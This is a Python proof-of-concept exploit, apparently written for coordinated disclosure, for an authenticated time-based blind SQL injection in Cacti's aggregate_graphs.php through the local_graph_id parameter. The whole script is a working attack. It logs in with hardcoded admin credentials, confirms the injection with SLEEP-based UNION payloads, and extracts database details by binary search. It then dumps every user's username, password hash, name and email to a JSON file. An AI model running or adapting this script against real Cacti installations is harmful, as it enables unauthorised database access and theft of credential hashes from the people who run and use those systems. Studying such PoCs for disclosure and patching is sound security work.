#!/usr/bin/env python3
"""
PoC: Authenticated SQL injection in Cacti `aggregate_graphs.php`
     via the unvalidated `local_graph_id` request variable.

Sink   : lib/functions.php  get_sequence()  -> db_fetch_row_prepared(
             "SELECT max(sequence)+1 AS seq FROM graph_templates_item WHERE <RAW>", [])
Source : aggregate_graphs.php:347  form_save()/save_component_item branch:
             get_sequence($sequence,'sequence','graph_templates_item',
                          'local_graph_id=' . grv('local_graph_id'))

Impact : authenticated arbitrary DB read (UNION/blind), incl. credential hashes.
Target : Cacti 1.3.0-dev (develop) via the repo docker-compose stack.
Author : CYBER-SEC  (coordinated-disclosure PoC)

Usage  : pip install requests && python3 exploit_cacti_sqli.py
         Requires Cacti running at http://localhost:8080/cacti (default docker-compose).
"""
import sys
import re
import time
import requests
import json

BASE    = "http://localhost:8080/cacti"
USER    = "admin"
PWD     = "Admin12345!"
SLEEP_T = 2.0
THRESH  = 1.2

CSRF_RE = re.compile(r"name=['\"]__csrf_magic['\"]\s+value=\"([^\"]*)\"")
s = requests.Session()
s.headers.update({"User-Agent": "cacti-sqli-poc"})


def csrf(html):
    m = CSRF_RE.search(html)
    if not m:
        raise RuntimeError("no __csrf_magic token found")
    return m.group(1)


def authed():
    r = s.get(BASE + "/host.php", timeout=30, allow_redirects=False)
    return r.status_code == 200 and "login_password" not in r.text


def token():
    return csrf(s.get(BASE + "/host.php", timeout=30).text)


def do_login(pw):
    tok = csrf(s.get(BASE + "/index.php", timeout=30).text)
    s.post(BASE + "/index.php", timeout=30, allow_redirects=False, data={
        "__csrf_magic": tok, "action": "login",
        "login_username": USER, "login_password": pw})


def login():
    do_login(PWD)
    if authed():
        print(f"[+] authenticated as {USER} (password: {PWD!r})")
        return
    raise RuntimeError("login failed with default credentials")


def inject(local_graph_id, tok):
    t0 = time.perf_counter()
    s.post(BASE + "/aggregate_graphs.php?action=save", timeout=60, allow_redirects=False, data={
        "__csrf_magic": tok,
        "save_component_input": "1",
        "save_component_item":  "1",
        "graph_type_id": "4",
        "local_graph_id": local_graph_id,
    })
    return time.perf_counter() - t0


def truth(cond, tok):
    payload = f"0 UNION SELECT IF(({cond}),SLEEP({SLEEP_T}),0)"
    return inject(payload, tok) > THRESH


def extract(subquery, maxlen, tok, label, show_progress=True):
    out = ""
    for pos in range(1, maxlen + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if truth(f"ASCII(SUBSTRING(({subquery}),{pos},1))>{mid}", tok):
                lo = mid + 1
            else:
                hi = mid
        if lo == 0:
            break
        out += chr(lo)
        if show_progress:
            print(f"      {label}[{pos:>2}] -> {out!r}")
    return out


def get_total_users(tok):
    """Get the total number of users in the database"""
    query = "SELECT COUNT(*) FROM user_auth"
    
    # Binary search for the count
    lo, hi = 0, 100  # Assuming max 100 users
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if truth(f"({query})>={mid}", tok):
            lo = mid
        else:
            hi = mid - 1
    
    return lo


def get_user_field(user_id, field, maxlen, tok, label):
    """Extract a specific field for a given user ID"""
    query = f"SELECT {field} FROM user_auth WHERE id={user_id} LIMIT 1"
    return extract(query, maxlen, tok, label)


def extract_all_users(tok, max_users=20):
    """Extract all user data from user_auth table"""
    print("\n[*] Dumping all user hashes from user_auth table")
    
    # First, count total users
    total = get_total_users(tok)
    print(f"[+] Found {total} users in database")
    
    if total == 0:
        print("[-] No users found!")
        return []
    
    users = []
    
    for user_id in range(1, total + 1):
        print(f"\n[*] Extracting data for user ID {user_id}")
        
        # Extract username
        username = get_user_field(user_id, "username", 50, tok, f"user{user_id}_username")
        if not username:
            print(f"[-] User ID {user_id} not found or empty username, skipping")
            continue
        
        # Extract password hash (length up to 60 for bcrypt)
        password = get_user_field(user_id, "password", 60, tok, f"user{user_id}_password")
        
        # Extract full name (optional)
        full_name = get_user_field(user_id, "full_name", 100, tok, f"user{user_id}_fullname")
        
        # Extract email (optional)
        email = get_user_field(user_id, "email", 100, tok, f"user{user_id}_email")
        
        # Extract enabled status
        enabled = "1" if truth(f"SELECT enabled FROM user_auth WHERE id={user_id}", tok) else "0"
        
        user_data = {
            "id": user_id,
            "username": username,
            "password_hash": password,
            "full_name": full_name,
            "email": email,
            "enabled": enabled
        }
        users.append(user_data)
        
        # Print summary for this user
        print(f"\n[+] User {user_id} summary:")
        print(f"    username: {username}")
        print(f"    password_hash: {password}")
        if full_name:
            print(f"    full_name: {full_name}")
        if email:
            print(f"    email: {email}")
        print(f"    enabled: {enabled}")
    
    return users


def main():
    print(f"[*] target: {BASE}")
    login()
    tok = token()

    # Step 1: time-based confirmation
    print("\n[*] Step 1 - time-based confirmation")
    base = inject("0", tok)
    slp  = inject(f"0 UNION SELECT SLEEP({SLEEP_T})", tok)
    print(f"    baseline  local_graph_id=0                          : {base:5.2f}s")
    print(f"    injected  local_graph_id=0 UNION SELECT SLEEP({SLEEP_T})   : {slp:5.2f}s")
    if not (slp > THRESH and base < THRESH):
        print("[-] no measurable time delta - target may be patched")
        sys.exit(2)
    print("[+] CONFIRMED: response time is attacker-controlled via injected SQL")

    # Step 2: boolean oracle sanity
    print("\n[*] Step 2 - boolean oracle sanity")
    print(f"    1=1 -> sleeps? {truth('1=1', tok)}    1=2 -> sleeps? {truth('1=2', tok)}")

    # Step 3: Get version info
    print("\n[*] Step 3 - extracting database info")
    ver = extract("SELECT VERSION()", 20, tok, "version")
    dbn = extract("SELECT DATABASE()", 20, tok, "database")
    
    print(f"\n[+] Database: {dbn} (MySQL {ver})")

    # Step 4: Extract all users
    print("\n[*] Step 4 - dumping all user hashes")
    users = extract_all_users(tok)

    # Step 5: Display all results in a nice format
    print("\n" + "="*60)
    print("POC RESULT - ALL USER HASHES")
    print("="*60)
    print(f"Database: {dbn} (MySQL {ver})")
    print(f"Total Users: {len(users)}")
    print("-"*60)
    
    for user in users:
        print(f"User ID: {user['id']}")
        print(f"  Username    : {user['username']}")
        print(f"  Password    : {user['password_hash']}")
        if user['full_name']:
            print(f"  Full Name   : {user['full_name']}")
        if user['email']:
            print(f"  Email       : {user['email']}")
        print(f"  Enabled     : {user['enabled']}")
        print("-"*40)
    
    # Save to file
    with open("cacti_users_dump.json", "w") as f:
        json.dump(users, f, indent=2)
    print(f"\n[+] User data saved to cacti_users_dump.json")
    
    print("\n" + "="*60)
    print("  -> Arbitrary DB read via blind SQLi in local_graph_id,")
    print("     including ALL administrator credential hashes.")
    print("="*60)


if __name__ == "__main__":
    main()
